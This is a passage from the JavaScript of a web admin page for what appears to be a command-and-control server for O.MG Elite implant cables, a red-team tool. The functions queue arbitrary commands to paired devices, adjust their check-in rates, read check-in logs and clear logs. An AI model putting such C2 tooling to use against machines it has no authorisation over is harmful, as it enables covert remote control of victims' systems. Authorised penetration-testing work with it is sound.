			const response = await fetch(`http://${hostname}:8080/C2admin`, {
				method: 'POST',
				body: JSON.stringify({
					alias: alias,
					action: 'queueAdd',
					data: data
				}),
				headers: {
					'Content-Type': 'application/json'
				}
			});

			if (response.ok) {
				try {
					const result = await response.json();
					// console.log(result);
				} catch (error) {
					// console.log('Response is not JSON:', error);
				}
			} else {
				// console.log('Error with request:', response.status);
			}

			loadAdminData();
			loadCmdQueue(alias);
		}

		async function deleteCmd(alias, index) {
			const response = await fetch(`http://${hostname}:8080/C2admin`, {
				method: 'POST',
				body: JSON.stringify({
					alias: alias,
					action: 'queueDelete',
					data: index
				}),
				headers: {
					'Content-Type': 'application/json'
				}
			});

			if (response.ok) {
				try {
					const result = await response.json();
					// console.log(result);
				} catch (error) {
					// console.log('Response is not JSON:', error);
				}
			} else {
				// console.log('Error with request:', response.status);
			}

			loadAdminData();
			loadCmdQueue(alias);
		}

		async function clearQueue(alias) {
			const response = await fetch(`http://${hostname}:8080/C2admin`, {
				method: 'POST',
				body: JSON.stringify({
					alias: alias,
					action: 'queueClear',
					data: ""
				}),
				headers: {
					'Content-Type': 'application/json'
				}
			});

			if (response.ok) {
				try {
					const result = await response.json();
					// console.log(result);
				} catch (error) {
					// console.log('Response is not JSON:', error);
				}
			} else {
				// console.log('Error with request:', response.status);
			}

			loadAdminData();
			loadCmdQueue(alias);
		}

		async function clearLog(aliasValue) {
			const response = await fetch(`http://${hostname}:8080/C2admin`, {
				method: 'POST',
				body: JSON.stringify({
					alias: aliasValue,
					action: 'logClear',
					data: ""
				}),
				headers: {
					'Content-Type': 'application/json'
				}
			});

			if (response.ok) {
				try {
					const result = await response.json();
					// console.log(result);
				} catch (error) {
					// console.log('Response is not JSON:', error);
				}
			} else {
				// console.log('Error with request:', response.status);
			}

			loadAdminData();
			loadCmdQueue(alias);
		}

		async function clearLogAll(aliasValue) {
			const response = await fetch(`http://${hostname}:8080/C2admin`, {
				method: 'POST',
				body: JSON.stringify({
					alias: aliasValue,
					action: 'logClearAll',
					data: ""
				}),
				headers: {
					'Content-Type': 'application/json'
				}
			});

			if (response.ok) {
				try {
					const result = await response.json();
					// console.log(result);
				} catch (error) {
					// console.log('Response is not JSON:', error);
				}
			} else {
				// console.log('Error with request:', response.status);
			}

			loadAdminData();
			loadCmdQueue(alias);
		}

		function loadCmdQueue(alias) {
			lastDateTime = "";
			const cmdQueueTable = document.getElementById('cmdQueueTable').getElementsByTagName('tbody')[0];
			cmdQueueTable.innerHTML = '';
			const device = adminData.devices.find(device => device.alias === alias);
			device.cmd_queue.forEach((cmd, index) => {
				const row = cmdQueueTable.insertRow();
				const cmdCell = row.insertCell(0);
				const actionCell = row.insertCell(1);

				cmdCell.textContent = cmd;

				const deleteButton = document.createElement('button');
				deleteButton.textContent = 'X';
				deleteButton.onclick = () => {
					deleteCmd(alias, index);
				};

				actionCell.appendChild(deleteButton);
			});
		}

		let processedMessages = new Set();

		function formatDateTime(date) {
			const year = date.getFullYear();
			const month = String(date.getMonth() + 1).padStart(2, '0');
			const day = String(date.getDate()).padStart(2, '0');
			const hour = String(date.getHours()).padStart(2, '0');
			const minute = String(date.getMinutes()).padStart(2, '0');
			const second = String(date.getSeconds()).padStart(2, '0');

			return `${year}/${month}/${day} - ${hour}:${minute}:${second}`;
		}

		async function loadLogs(alias) {
			const aliasSelect = document.getElementById('alias');
			let aliasToUse = alias ? alias : (aliasSelect.value ? aliasSelect.value : "");
			clearLogsAlias = document.getElementById('clearLogsAlias');
			clearLogsAlias.innerHTML = aliasToUse;
			let url = aliasToUse && aliasToUse.length > 0 ?
				`http://${hostname}:8080/C2log?alias=${encodeURIComponent(aliasToUse)}` :
				`http://${hostname}:8080/C2log`;

			if (c2logAbridge == "1") {
				url += (url.includes("?") ? "&" : "?") + "abridge=True";
			}

			const response = await fetch(url);
			let data = await response.text();
			let lines = data.split('\n');
			document.getElementById('c2log').textContent = lines.join('\n');

			let lastOutLine = lines.slice().reverse().find(line => line.includes(', out,'));
			if (lastOutLine) {
				let parts = lastOutLine.split(', ');
				let dateTime = new Date(parts[1]);
				let currentTime = new Date();
				let difference = (currentTime - dateTime) / 1000;
				let pollRate = 10 * Number(document.getElementById('queuePollRate').value);

				if (difference > pollRate || alwaysDisplayLastPoll == "1") {
					document.getElementById('navbarAlerts').innerHTML = `Last Check-In: ${formatDateTime(dateTime)}`;
				} else {
					document.getElementById('navbarAlerts').innerHTML = '';
				}
			}

			lines = lines.filter(line => !line.match(/.*, out, .*/));

			for (let line of lines) {
				if (line !== "" && !processedMessages.has(line)) {
					let parts = line.split(', ');
					let dateTime = new Date(parts[1]);
					if (lastDateTime !== null && dateTime < lastDateTime) {
						continue;
					}
					lastDateTime = dateTime;
					let apiMessage = parts[3];
					processOnMessage(apiMessage);
					processedMessages.add(line);
				}
			}
		}

		async function loadAdminData() {
			const aliasSelect = document.getElementById('alias');
			const response = await fetch(`http://${hostname}:8080/C2admin`);
			adminData = await response.json();

			if (!adminData.devices.length) {
				createDialog({
					id: 'C2Error',
					title: 'C2Server Provisioning Error',
					description: 'No devices have been configured.<br /><br /> Please run provisioning via:<br /> python3 ./c2server.py provision [deviceAlias] [poll_rate] [fast_rate] [connect_rate]<br /><br /> Then use the subsequent Provisioning Data to pair an O.MG Elite device to this C2 Server.<br /><br />See: <a href="https://github.com/O-MG/O.MG-Firmware/wiki#c2server">https://github.com/O-MG/O.MG-Firmware/wiki#c2server</a>',
					closeEnabled: true,
				});
				return;
			}

			let currentAliases = Array.from(aliasSelect.options, option => option.value);
			adminData.devices.forEach(device => {
				if (currentAliases.includes(device.alias)) {
					const index = currentAliases.indexOf(device.alias);
					if (index > -1) {
						currentAliases.splice(index, 1);
					}
					return;
				}

				const option = document.createElement('option');
				option.text = device.alias;
				option.value = device.alias;
				aliasSelect.add(option);
			});
			currentAliases.forEach(alias => {
				for (let i = 0; i < aliasSelect.options.length; i++) {
					if (aliasSelect.options[i].value === alias) {
						aliasSelect.remove(i);
						break;
					}
				}
			});
			Array.from(aliasSelect.options)
				.sort((a, b) => a.text === b.text ? 0 : a.text < b.text ? -1 : 1)
				.forEach(option => aliasSelect.add(option, null));

			aliasSelect.onchange = () => {
				loadCmdQueue(aliasSelect.value);

				const selectedDevice = adminData.devices.find(device => device.alias === aliasSelect.value);

				if (selectedDevice) {
					document.getElementById('queueContactRate').value = selectedDevice.contact_seconds;
					document.getElementById('queuePollRate').value = selectedDevice.poll_seconds;
					document.getElementById('queueFastRate').value = selectedDevice.fast_seconds;
				}
			};

			loadCmdQueue(aliasSelect.value);
			const selectedDevice = adminData.devices.find(device => device.alias === aliasSelect.value);

			if (selectedDevice) {
				document.getElementById('queueContactRate').value = selectedDevice.contact_seconds;
				document.getElementById('queuePollRate').value = selectedDevice.poll_seconds;
				document.getElementById('queueFastRate').value = selectedDevice.fast_seconds;
			}
		}

		async function changePollRate() {
			aliasSelect = document.getElementById('alias').value;
			pollSeconds = document.getElementById('queuePollRate').value;
			fastSeconds = document.getElementById('queueFastRate').value;
			contactSeconds = document.getElementById('queueContactRate').value;

			const response = await fetch(`http://${hostname}:8080/C2admin`, {
				method: 'POST',
				body: JSON.stringify({
					alias: aliasSelect,
					action: 'pollInterval',
					data: {
						pollSeconds,
						fastSeconds,
						contactSeconds,
					},
				}),
				headers: {
					'Content-Type': 'application/json'
				}
			});

			if (response.ok) {
				try {
					const result = await response.json();
					// console.log(result);
				} catch (error) {
					// console.log('Response is not JSON:', error);
				}
			} else {
				// console.log('Error with request:', response.status);
			}

			loadAdminData();
			loadCmdQueue(alias);
		}

		function changeRefreshRate(value) {
			refreshRate = value;
			clearInterval(logsIntervalId);
			clearInterval(adminIntervalId);
			logsIntervalId = setInterval(loadLogs, refreshRate * 1000);
			adminIntervalId = setInterval(loadAdminData, refreshRate * 1000);
		}

		window.onload = () => {
			loadAdminData();
			const aliasSelect = document.getElementById('alias');
			loadLogs(aliasSelect.value);
			clearInterval(logsIntervalId);
			clearInterval(adminIntervalId);
			logsIntervalId = setInterval(loadLogs, refreshRate * 1000);
			adminIntervalId = setInterval(loadAdminData, refreshRate * 1000);

			document.getElementById('queryDeviceStatus').onclick = () => {
				const deviceStatusCommands = ["CI", "CV", "CWInfo", "CNGet", "CTList", "CFList", "CWStatus", "CEStatus", "CLStatus", "[CHStatus]CHStatus", "C2Status"];
				deviceStatusCommands.forEach((cmd) => addCmd(aliasSelect.value, cmd));
			};
			document.getElementById('modifyQueueC2').onclick = null;
			document.getElementById('modifyQueueC2').onclick = () => {
				const cmddata = document.getElementById('data');
				addCmd(aliasSelect.value, cmddata.value);
			};
			document.getElementById('deleteAllButton').onclick = () => {
				clearQueue(aliasSelect.value);
			};
			document.getElementById('clearLogsButton').onclick = () => {
				clearLog(aliasSelect.value);
			};
			document.getElementById('clearAllLogsButton').onclick = () => {
				clearLogAll(aliasSelect.value);
			};
		};

		const connect = (() => {
			const aliasSelect = document.getElementById('alias');
			let messageQueue = [];

			function queueMessage(message) {
				addCmd(aliasSelect.value, message);
			}

			function sendMessage(message) {
				if (!messageQueue.includes(message)) {
					messageQueue.push(message);
				}
			}

			setInterval(() => {
				if (messageQueue.length > 0) {
					queueMessage(messageQueue.shift());
				}
			}, 250);

			return {
				sendMessage,
			};
		})();
	</script>
</body>

</html>